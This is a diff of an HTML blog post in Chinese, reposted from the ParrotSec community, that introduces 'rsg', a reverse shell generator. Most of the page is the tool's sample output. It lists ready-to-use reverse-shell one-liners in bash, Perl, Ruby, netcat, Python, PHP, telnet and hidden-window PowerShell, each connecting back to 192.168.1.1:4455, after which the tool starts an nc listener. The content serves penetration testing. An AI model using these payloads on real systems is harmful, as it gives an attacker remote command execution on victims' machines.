@@ -540,17 +540,17 @@ document.getElementsByTagName('head')[0].appendChild(script);
 </code></pre><p>###安装</p>
 <pre><code>cd rsg/
 sudo chmod +x install.sh
-</code></pre><pre><code>┌─[✗]─[parrot@parrot]─[~/Desktop/rsg]
-└──╼ $sudo ./install.sh 
-Collecting clint (from -r dependencies.txt (line 1))
+</code></pre><pre class=" language-bash"><code class="language-bash">┌─<span class="token punctuation">[</span>✗<span class="token punctuation">]</span>─<span class="token punctuation">[</span>parrot@parrot<span class="token punctuation">]</span>─<span class="token punctuation">[</span>~/Desktop/rsg<span class="token punctuation">]</span>
+└──╼ <span class="token variable">$sudo</span> ./install.sh 
+Collecting clint <span class="token punctuation">(</span>from -r dependencies.txt <span class="token punctuation">(</span>line 1<span class="token punctuation">))</span>
   Downloading clint-0.5.1.tar.gz
-Collecting args (from clint-&gt;-r dependencies.txt (line 1))
+Collecting args <span class="token punctuation">(</span>from clint-<span class="token operator">></span>-r dependencies.txt <span class="token punctuation">(</span>line 1<span class="token punctuation">))</span>
   Downloading args-0.1.0.tar.gz
-Building wheels for collected packages: clint, args
-  Running setup.py bdist_wheel for clint ... done
-  Stored in directory: /root/.cache/pip/wheels/aa/65/4a/a0bceb0a6bee518b1dace4c803f24c4ac8febe55bdca0f14ed
-  Running setup.py bdist_wheel for args ... done
-  Stored in directory: /root/.cache/pip/wheels/0a/e0/66/35419f9f9ee41099a3631f0f308b9604bd1ffeabc066d69070
+Building wheels <span class="token keyword">for</span> collected packages: clint, args
+  Running setup.py bdist_wheel <span class="token keyword">for</span> clint <span class="token punctuation">..</span>. <span class="token keyword">done</span>
+  Stored <span class="token keyword">in</span> directory: /root/.cache/pip/wheels/aa/65/4a/a0bceb0a6bee518b1dace4c803f24c4ac8febe55bdca0f14ed
+  Running setup.py bdist_wheel <span class="token keyword">for</span> args <span class="token punctuation">..</span>. <span class="token keyword">done</span>
+  Stored <span class="token keyword">in</span> directory: /root/.cache/pip/wheels/0a/e0/66/35419f9f9ee41099a3631f0f308b9604bd1ffeabc066d69070
 Successfully built clint args
 Installing collected packages: args, clint
 Successfully installed args-0.1.0 clint-0.5.1
@@ -558,58 +558,60 @@ Syntax Error:
 python /usr/local/bin/rsg ip port
 Example:
 python /usr/local/bin/rsg 192.168.10.1 4444
-</code></pre><p>##使用</p>
+</code></pre>
+<p>##使用</p>
 <p>使用方法非常简单</p>
 <p>执行</p>
 <pre><code>rsg [回连的ip] [回连的端口]
 </code></pre><p>之后会得到各种反弹一句话，包括Linux和Windows</p>
 <p>如:</p>
-<pre><code>┌─[✗]─[parrot@parrot]─[~/Desktop/rsg]
-└──╼ $rsg 192.168.1.1 4455
+<pre class=" language-bash"><code class="language-bash">┌─<span class="token punctuation">[</span>✗<span class="token punctuation">]</span>─<span class="token punctuation">[</span>parrot@parrot<span class="token punctuation">]</span>─<span class="token punctuation">[</span>~/Desktop/rsg<span class="token punctuation">]</span>
+└──╼ <span class="token variable">$rsg</span> 192.168.1.1 4455
 BASH REVERSE SHELL
-bash -i &gt;&amp; /dev/tcp/192.168.1.1/4455 0&gt;&amp;1
+<span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.1.1/4455 0<span class="token operator">></span><span class="token operator">&amp;</span>1
 
 BASH REVERSE SHELL
-0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.1.1/4455; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>196<span class="token punctuation">;</span><span class="token function">exec</span> 196<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/192.168.1.1/4455<span class="token punctuation">;</span> sh <span class="token operator">&lt;</span><span class="token operator">&amp;</span>196 <span class="token operator">></span><span class="token operator">&amp;</span>196 2<span class="token operator">></span><span class="token operator">&amp;</span>196
 
 PERL REVERSE SHELL
-perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.1.1:4455&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;
+perl -MIO -e <span class="token string">'<span class="token variable">$p</span>=fork;exit,if(<span class="token variable">$p</span>);<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"192.168.1.1:4455");STDIN->fdopen(<span class="token variable">$c</span>,r);$~->fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;>;'</span>
 
 PERL REVERSE SHELL WINDOWS
-perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&quot;192.168.1.1:4455&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;
+perl -MIO -e <span class="token string">'<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"192.168.1.1:4455");STDIN->fdopen(<span class="token variable">$c</span>,r);$~->fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;>;'</span>
 
 RUBY REVERSE SHELL
-ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;192.168.1.1&quot;,&quot;4455&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;
+ruby -rsocket -e <span class="token string">'exit if fork;c=TCPSocket.new("192.168.1.1","4455");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>
 
 RUBY REVERSE SHELL
-ruby -rsocket -e&#39;f=TCPSocket.open(&quot;192.168.1.1&quot;,4455).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
+ruby -rsocket -e<span class="token string">'f=TCPSocket.open("192.168.1.1",4455).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span>
 
 RUBY REVERSE SHELL WINDOWS
-ruby -rsocket -e &#39;c=TCPSocket.new(&quot;192.168.1.1&quot;,&quot;4455&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;
+ruby -rsocket -e <span class="token string">'c=TCPSocket.new("192.168.1.1","4455");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>
 
 NETCAT REVERSE SHELL
 nc -c /bin/sh 192.168.1.1 4455
 
 NETCAT REVERSE SHELL
-/bin/sh | nc 192.168.1.1 4455
+/bin/sh <span class="token operator">|</span> nc 192.168.1.1 4455
 
 NETCAT REVERSE SHELL
-rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 192.168.1.1 4455 0/tmp/p
+<span class="token function">rm</span> -f /tmp/p<span class="token punctuation">;</span> <span class="token function">mknod</span> /tmp/p p <span class="token operator">&amp;&amp;</span> nc 192.168.1.1 4455 0/tmp/p
 
 PYTHON REVERSE SHELL
-python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.1&quot;,4455));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>"<span class="token number">192.168</span>.<span class="token number">1.1</span>"<span class="token punctuation">,</span><span class="token number">4455</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
 
 PHP REVERSE SHELL
-php -r &#39;$sock=fsockopen(&quot;192.168.1.1&quot;,4455);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+php -r <span class="token string">'<span class="token variable">$sock</span>=fsockopen("192.168.1.1",4455);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span>
 
 TELNET REVERSE SHELL
-rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet 192.168.1.1 4455 0/tmp/p
+<span class="token function">rm</span> -f /tmp/p<span class="token punctuation">;</span> <span class="token function">mknod</span> /tmp/p p <span class="token operator">&amp;&amp;</span> telnet 192.168.1.1 4455 0/tmp/p
 
 POWERSHELL REVERSE SHELL
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;192.168.1.1&quot;,4455);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient<span class="token punctuation">(</span><span class="token string">"192.168.1.1"</span>,4455<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> <span class="token operator">=</span> <span class="token variable">$client</span>.GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token variable">$bytes</span> <span class="token operator">=</span> 0<span class="token punctuation">..</span>65535<span class="token operator">|</span>%<span class="token punctuation">{</span>0<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne 0<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="token punctuation">)</span>.GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span>,0, <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> <span class="token operator">=</span> <span class="token punctuation">(</span>iex <span class="token variable">$data</span> 2<span class="token operator">></span><span class="token operator">&amp;</span>1 <span class="token operator">|</span> Out-String <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span>  <span class="token operator">=</span> <span class="token variable">$sendback</span> + <span class="token string">"PS "</span> + <span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>.Path + <span class="token string">"> "</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>text.encoding<span class="token punctuation">]</span>::ASCII<span class="token punctuation">)</span>.GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Write<span class="token punctuation">(</span><span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$client</span>.Close<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-Select your payload, press any key to start the nc listener and send it to the target...
-</code></pre><p>之后输入任意键会启动nc进行监听等待回连</p>
+Select your payload, press any key to start the nc listener and send it to the target<span class="token punctuation">..</span>.
+</code></pre>
+<p>之后输入任意键会启动nc进行监听等待回连</p>
 <p>来源:<a href="https://parrotsec-china.org/t/revershellgenerator-14-shell/694" target="_blank" rel="external">ParrotSec中文社区</a></p>
 <hr>
 <p><em>*转载请注明来自<a href="https://ares-x.com">AresX’s Blog</a></em></p>
